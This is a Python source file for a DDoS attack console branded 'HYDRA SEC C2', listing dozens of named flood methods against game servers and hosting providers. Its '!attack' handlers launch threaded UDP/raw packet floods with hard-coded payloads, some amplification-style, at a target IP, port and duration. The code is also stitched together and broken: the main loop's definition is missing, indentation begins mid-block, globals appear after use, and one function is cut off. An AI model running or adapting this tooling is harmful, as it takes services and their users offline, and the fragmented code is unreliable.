#HAYO YANG DECODE MAU NYOLONG YA?
#AUTHOR : ACEE
#DIA MOOD BOOSTER :)
import random
import socket
import struct
import time
import threading
import os
import codecs
import sys
import urllib
import json
import getpass

nicknm = "HYDRA"

methods = """
\033[36m╔════════════════════════╗
\033[36m║ \033[34m---- \033[32mMethods List! \033[34m--- \033[36m╚═════════╗
\033[36m║ \033[37mgen3   \033[32m> \033[37mShows Gen3 Methods!     \033[36m║
\033[36m║ \033[37mlayer4 \033[32m> \033[37mShows Layer 4 Methods!  \033[36m║
\033[36m║ \033[37mlayer7 \033[32m> \033[37mShows Layer 7 Methods!  \033[36m║
\033[36m║ \033[37mraw    \033[32m> \033[37mShows Raw Methods!      \033[36m║
\033[36m║ \033[37mmore   \033[32m> \033[37mShows More Methods!     \033[36m║
\033[36m╚══════════════════════════════════╝
"""

raw = """
\033[36m
╦╦╦ ╦╔╦╗╦═╗╔═╗ \033[37m╔═╗╔═╗╔═╗
\033[36m
╠═╣╚╦╝ ║║╠╦╝╠═╣\033[37m╚═╗║╣ ║  
\033[36m
╩ ╩ ╩ ═╩╝╩╚═╩ ╩\033[37m╚═╝╚═╝╚═╝

\033[36m            ╔══════════════════════════╦════════════════════════════╗
\033[36m            ║ \033[37mudpraw \033[34m- \033[37mRaw UDP Flood \033[36m  ║ \033[37mhexraw \033[34m- \033[37mRaw HEX Flood \033[36m    ║
\033[36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[36m             ║ \033[37mtcpraw \033[34m- \033[37mRaw TCP Flood \033[36m║ ║ \033[37mvseraw \033[34m- \033[37mRaw VSE Flood \033[36m  ║
\033[36m             ║ \033[37mstdraw \033[34m- \033[37mRaw STD Flood \033[36m║ ║ \033[37mqmsynraw \033[34m- \033[37mRaw SYN Flood \033[36m║
\033[36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[36m            ║    \033[37mExample How To Attack\033[34m: \033[32m!ATTACK METHOD [IP] [TIME] [PORT]   \033[36m║
\033[36m            ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
\033[36m
╦╦╦ ╦╔╦╗╦═╗╔═╗ \033[37m╔═╗╔═╗╔═╗
\033[36m
╠═╣╚╦╝ ║║╠╦╝╠═╣\033[37m╚═╗║╣ ║  
\033[36m
╩ ╩ ╩ ═╩╝╩╚═╩ ╩\033[37m╚═╝╚═╝╚═╝

\033[36m            ╔══════════════════════════╦════════════════════════════╗
\033[36m            ║ \033[37movhslav \033[34m- \033[37mSlavic Flood \033[36m  ║ \033[37miotv1 \033[34m- \033[37mCustom Method!  \033[36m   ║
\033[36m            ║ \033[37mcpukill \033[34m- \033[37mCpu Rape Flood\033[36m ║ \033[37miotv2 \033[34m- \033[37mCustom Method!  \033[36m   ║
\033[36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[36m             ║ \033[37mfivemkill \033[34m- \033[37mFivem Kill \033[36m║ ║ \033[37miotv3 \033[34m-\033[37m Custom Method!  \033[36m ║
\033[36m             ║ \033[37micmprape  \033[34m- \033[37mICMP Rape  \033[36m║ ║ \033[37mssdp  \033[34m-\033[37m Amped SSDP      \033[36m ║
\033[36m             ║ \033[37mtcprape \033[34m- \033[37mRaping TCP   \033[36m║ ║ \033[37marknull \033[34m- \033[37mArk Method    \033[36m ║
\033[36m             ║ \033[37mnforape \033[34m- \033[37mNfo Method   \033[36m║ ║ \033[37m2kdown  \033[34m- \033[37mNBA 2K Flood  \033[36m ║
\033[36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[36m            ║    \033[37mExample How To Attack\033[34m: \033[32m!ATTACK METHOD [IP] [TIME] [PORT]   \033[36m║
\033[36m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\033[36m
╦╦╦ ╦╔╦╗╦═╗╔═╗ \033[37m╔═╗╔═╗╔═╗
\033[36m
╠═╣╚╦╝ ║║╠╦╝╠═╣\033[37m╚═╗║╣ ║  
\033[36m
╩ ╩ ╩ ═╩╝╩╚═╩ ╩\033[37m╚═╝╚═╝╚═╝

\033[36m            ╔══════════════════════════╦════════════════════════════╗
\033[36m            ║ \033[37mhomeslap    \033[34m. \033[37mr6kill     \033[36m║ \033[37mfivemtcp  \033[34m. \033[37mnfokill       \033[36m ║
\033[36m            ║ \033[37mark255      \033[34m. \033[37marklift    \033[36m║ \033[37mhotspot   \033[34m. \033[37mvpn           \033[36m ║
\033[36m            ║ \033[37mhydrakiller \033[34m. \033[37markdown    \033[36m║ \033[37mnfonull   \033[34m. \033[37mdhcp          \033[36m ║
\033[36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[36m             ║ \033[37movhnat    \033[34m. \033[37movhamp     \033[36m║ ║ \033[37movhwdz    \033[34m. \033[37movhx         \033[36m║
\033[36m             ║ \033[37mnfodrop   \033[34m. \033[37mnfocrush   \033[36m║ ║ \033[37mnfodown   \033[34m. \033[37mnfox         \033[36m║
\033[36m             ║ \033[37mudprape   \033[34m. \033[37mudprapev3  \033[36m║ ║ \033[37mfortnite  \033[34m. \033[37mfortnitev2   \033[36m║
\033[36m             ║ \033[37mudprapev2 \033[34m. \033[37mudpbypass  \033[36m║ ║ \033[37mgreeth    \033[34m. \033[37mtelnet       \033[36m║
\033[36m             ║ \033[37mfivemv2   \033[34m. \033[37mr6drop     \033[36m║ ║ \033[37mr6freeze  \033[34m. \033[37mkillall      \033[36m║
\033[36m             ║ \033[37m2krape    \033[34m. \033[37mfallguys   \033[36m║ ║ \033[37movhdown   \033[34m. \033[37movhkill      \033[36m║
\033[36m             ║ \033[37mfivemrape \033[34m. \033[37mfivemdown  \033[36m║ ║ \033[37mfivemv1   \033[34m. \033[37mfivemslump   \033[36m║
\033[36m             ║ \033[37mkillallv2 \033[34m. \033[37mkillallv3  \033[36m║ ║ \033[37mpowerslap \033[34m. \033[37mrapecom      \033[36m║
\033[36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[36m            ║    \033[37mExample How To Attack\033[34m: \033[32m!ATTACK METHOD [IP] [TIME] [PORT]   \033[36m║
\033[36m            ╚═══════════════════════════════════════════════════════╝
"""



layer4 = """
\033[36m
╦╦╦ ╦╔╦╗╦═╗╔═╗ \033[37m╔═╗╔═╗╔═╗
\033[36m
╠═╣╚╦╝ ║║╠╦╝╠═╣\033[37m╚═╗║╣ ║  
\033[36m
╩ ╩ ╩ ═╩╝╩╚═╩ ╩\033[37m╚═╝╚═╝╚═╝
\033[36m            ╔══════════════════════════╦════════════════════════════╗
\033[36m            ║  \033[37mudp \033[37m[IP] [TIME] [PORT]  \033[36m║   \033[37mvse \033[37m[IP] [TIME] [PORT]   \033[36m║
\033[36m            ║  \033[37mtcp \033[37m[IP] [TIME] [PORT]  \033[36m║   \033[37mack \033[37m[IP] [TIME] [PORT]   \033[36m║
\033[36m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[36m             ║ \033[37mstd \033[37m[IP] [TIME] [PORT] \033[36m║ ║ \033[37mdns \033[37m[IP] [TIME] [PORT]   \033[36m║
\033[36m             ║ \033[37msyn \033[37m[IP] [TIME] [PORT] \033[36m║ ║ \033[37movh \033[37m[IP] [TIME] [PORT]   \033[36m║
\033[36m             ║\033[37m- - - - - - - \033[34mhomerape \033[33m[IP] [TIME] [PORT] \033[37m- - - - - -\033[36m║
\033[36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[36m            ║    \033[37mExample How To Attack\033[93m: \033[32m!ATTACK METHOD [IP] [TIME] [PORT]   \033[36m║
\033[36m            ╚═══════════════════════════════════════════════════════╝
"""
layer7 = """
\033[36m
╦╦╦ ╦╔╦╗╦═╗╔═╗ \033[37m╔═╗╔═╗╔═╗
\033[36m
╠═╣╚╦╝ ║║╠╦╝╠═╣\033[37m╚═╗║╣ ║  
\033[36m
╩ ╩ ╩ ═╩╝╩╚═╩ ╩\033[37m╚═╝╚═╝╚═╝
\033[36m             ╔══════════════════════════╦════════════════════════════╗
\033[0;36m            ║  \033[0;34mhttp-stm \033[36m[IP] [TIME] [PORT]  \033[0;36m	       		 
\033[0;36m            ║  \033[0;34mhttp-cld \033[36m[IP] [TIME] [PORT]  \033[0;36m		
\033[0;36m            ╚╦════════════════════════╦╩╦═════════════════════════╦╝
\033[0;36m             ║ \033[0;34mddos-guard \033[36m[IP] [TIME] [PORT] \033[0;36m                           
\033[0;36m             ║ \033[0;34mcloudflare \033[36m[IP] [TIME] [PORT] \033[0;36m                             
\033[0;36m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[0;36m            ║    \033[0;34mExample How To Attack\033[93m: \033[31m!ATTACK METHOD [IP] [TIME] [PORT]   \033[0;36m║
\033[0;36m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """
\033[36m
╦╦╦ ╦╔╦╗╦═╗╔═╗ \033[37m╔═╗╔═╗╔═╗
\033[36m
╠═╣╚╦╝ ║║╠╦╝╠═╣\033[37m╚═╗║╣ ║  
\033[36m
╩ ╩ ╩ ═╩╝╩╚═╩ ╩\033[37m╚═╝╚═╝╚═╝

\033[36m                ╔═══════════════════════════════════════════════╗
\033[36m                ║\033[37m- - - - - - - HYDRA SEC C2 BY \033[37m@ACEE \033[37m- - - - - - -\033[36m ║
\033[36m                ║\033[37m  - - - Type \033[37mhelp\033[37m to see the Help Menu - - -\033[36m   ║
\033[36m                ╚═══════════════════════════════════════════════╝
"""


		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "?":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "layer4":
			os.system ("clear")
			print (layer4)
			main()
		elif sinput == "layer7":
			os.system ("clear")
			print (layer7)
			main()
		elif sinput == "method":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "private":
			os.system ("clear")
			print (private)
			main()
		elif sinput == "gen3":
			os.system ("clear")
			print (gen3)
			main()
		elif sinput == "raw":
			os.system ("clear")
			print (raw)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "!attack std":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack dns":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack ovh":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack vse":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack syn":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[37mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack tcp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack homeslap":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack udp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack killallv2":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack killallv3":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack udprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 0
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack udprapev2":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack udpbypass":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack icmprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack udprapev3":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack nfodrop":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack ovhnat":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack ovhamp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack nfocrush":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack greeth":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack telnet":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack ovhkill":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack ovhdown":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack cloudflare":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
		elif sinput == "!attack http-stm":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
		elif sinput == "!attack ddos-guard":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack ssdp":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack hydrakiller":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack nfonull":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack killall":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack ovhslav":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack cpukill":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack tcprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack nforape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack udpraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack tcpraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack hexraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack stdraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack vseraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "!attack synraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[37mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()
			
			
try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
fake_ip = '158.69.5.116' #fake ip
cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
